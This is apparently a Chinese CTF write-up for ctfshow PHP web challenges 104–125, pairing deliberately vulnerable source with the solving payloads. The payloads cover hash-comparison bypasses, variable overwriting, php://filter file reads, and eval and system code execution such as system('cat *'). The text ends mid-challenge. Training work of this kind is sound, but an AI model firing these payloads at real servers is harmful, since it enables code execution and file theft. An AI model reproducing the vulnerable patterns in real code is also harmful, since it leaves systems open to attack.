<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>数组绕过</p>
<h3 id="web105">**web105</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line">$suces=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">&#x27;flag&#x27;</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.$flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure>
<p>考察变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET: ?suces&#x3D;flag</span><br><span class="line">POST: error&#x3D;suces</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET: ?suces&#x3D;flag&amp;flag&#x3D;1</span><br><span class="line">POST flag&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="Web106">Web106</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>数组绕过</p>
<h3 id="web107">web107</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">&#x27;flag&#x27;</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>弱类型比较</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET: ?v3&#x3D;byGcY</span><br><span class="line">POST: v1&#x3D;flag&#x3D;0e00</span><br></pre></td></tr></table></figure>
<blockquote>
<p>parse_str ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encoded_string</span><br></pre></td></tr></table></figure>
<p>输入的字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">result</span><br></pre></td></tr></table></figure>
<p>如果设置了第二个变量 <code>result</code>， 变量将会以数组元素的形式存入到这个数组，作为替代。</p>
<p>PHP7.2版本以上必须有result参数</p>
</blockquote>
<h3 id="web108">web108</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ereg存在%00截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;a%00778</span><br></pre></td></tr></table></figure>
<h3 id="web109">**web109</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v1) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>据说这题目出的有点问题，但是我还是不知道Exception的构造函数可以执行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;cat *&#39;)</span><br></pre></td></tr></table></figure>
<h3 id="web110">**web110</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 FilesystemIterator 获取指定目录下的所有文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure>
<p>然后直接访问文件。</p>
<h3 id="web111">**web111</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;$v1,&amp;$v2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接看payload吧。。使用全局变量来进行赋值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
<blockquote>
<p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
</blockquote>
<p><code>$$v1 = &amp;$$v2</code>等价于<code>$ctfshow=&amp;$GLOBALS</code>。</p>
<h3 id="web112">web112</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>is_file可以用伪协议绕过：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;test.php&#x27;</span>)); <span class="comment">// bool(true)</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;php://filter/convert.base64-encode/resource=test.php&#x27;</span>)); <span class="comment">// bool(false)</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;file:///flag&#x27;</span>)); <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>
<p>过滤base64、rot13和string编码，其实不用编码也行</p>
<blockquote>
<p>PHP支持的字符编码https://www.php.net/manual/zh/mbstring.supported-encodings.php</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>或者换一个编码方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>如果过滤了php和filter，可以换一种伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web113">web113</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以用上一道题的payload。</p>
<p>也可以用伪协议配合多级符号链接的办法进行绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web114">web114</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web115">**web115</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$num</span>)</span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要考察trim绕过，从源码可以看出，过滤的空白字符少了一个\f，用%0c过。并且，is_numeric函数开始判断之前，首先会跳过所有空白字符。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;%0c36</span><br></pre></td></tr></table></figure>
<h3 id="web123">web123</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个点在于PHP变量命名是不允许使用点号的，存在点号的参数出入后会被解析成下划线<code>_</code>。</p>
<p>yu22x师傅提到用Fuzz的方式暴力破解：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url,$data</span>)</span>&#123;</span><br><span class="line">	$ch = curl_init(); </span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">	$response = curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">	<span class="keyword">return</span> strlen($response);</span><br><span class="line">&#125;</span><br><span class="line">$url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;=<span class="number">128</span> ; $j++) &#123;</span><br><span class="line">			$data=<span class="string">&quot;CTF&quot;</span>.urlencode(chr($i)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr($j)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">				<span class="keyword">if</span>(curl($url,$data)!=<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> $data.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">				&#125;</span><br><span class="line">   		&#125;</span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>CTF[SHOW.COM</code>是可以绕过的。</p>
<p>第二个知识点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line">2、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line">	</span><br><span class="line">设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">$argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure>
<p>相当于<code>$a[0]=$_SERVER['QUERY_STRING']</code>，所以payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get:  $fl0g&#x3D;flag_give_me;</span><br><span class="line">post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure>
<p>再来一个非预期解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag</span><br></pre></td></tr></table></figure>
<p>预期解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get: a&#x3D;1+fl0g&#x3D;flag_give_me</span><br><span class="line">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入 a=1+fl0g=flag_give_me</span></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="web125">web125</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span 